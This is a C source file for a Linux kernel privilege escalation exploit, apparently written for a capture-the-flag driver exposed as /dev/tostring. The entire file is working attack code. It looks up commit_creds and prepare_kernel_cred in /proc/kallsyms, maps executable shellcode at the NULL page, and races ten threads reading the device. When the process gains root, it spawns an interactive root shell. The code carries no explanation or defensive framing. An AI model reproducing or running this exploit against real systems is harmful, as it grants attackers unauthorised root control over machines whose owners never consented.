#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/mman.h>

// gcc --static exp.c -o exp -lpthread

#define THREADS 10

typedef unsigned long (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

pthread_attr_t attr;
pthread_t thread[THREADS];

void shell(void) {
	char *cmd = "/bin/sh";
	char *args[] = {cmd, "-i", NULL};
	printf("[+] Got root shell :)\n");
 	execve(cmd, args, NULL);
}

void *get_ksym(char *name) {
	FILE *f = fopen("/proc/kallsyms", "rb");
	char c, sym[512];
	void *addr;
	int ret;

	while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
		if (!strcmp(sym, name))
	  		return addr;

	return NULL;
}

int fd;

void *hebra_read (void *argum) {
	char buffer[1337] = {0};
	for (int i = 0; i < 1000; i++) {
		fd = open("/dev/tostring", O_RDWR);		
		read(fd, buffer, 1337);
		if (!getuid()) {
			shell();
		}
		close(fd);
	}
}

int main(int argc, char *argv[]) {

	prepare_kernel_cred = get_ksym("prepare_kernel_cred");
 	commit_creds        = get_ksym("commit_creds");

	printf("[+] commit_creds %p\n", commit_creds);
	printf("[+] prepare_kernel_cred %p\n", prepare_kernel_cred);

	if (mmap((void *) NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_SHARED, -1, 0) == MAP_FAILED) {
		perror("[-] mmap()");
		return -1;
	}

	unsigned char get_root[] =      "\x48\x31\xff"				/* xor    rdi, rdi */
					"\x48\xc7\xc2"				/* mov rdx, prepare_kernel_creds */
					"\x00\x00\x00\x00"			
					"\xff\xd2"				/* call   rdx */
					"\x48\x89\xc7"				/* mov    rdi, rax */
					"\x48\xc7\xc2"				/* mov rdx, commit_creds */
					"\x00\x00\x00\x00"			
					"\xff\xd2"				/* call   rdx */
					"\xc3";					/* ret */	   

	*(unsigned int *) (get_root + 6)  = (unsigned int)prepare_kernel_cred & 0xffffffff;
	*(unsigned int *) (get_root + 18) = (unsigned int)commit_creds & 0xffffffff;

	memcpy((void *) NULL, get_root, sizeof(get_root));
	
	printf("[+] wait to race condition...\n");

	pthread_attr_init(&attr);

	for (int i = 0; i < THREADS; i++)
		pthread_create(&thread[i], &attr, hebra_read, NULL);

	for (int i = 0; i < THREADS; i++)
		pthread_join(thread[i], NULL);

	printf("[-] Failed\n");

	return 0;
}

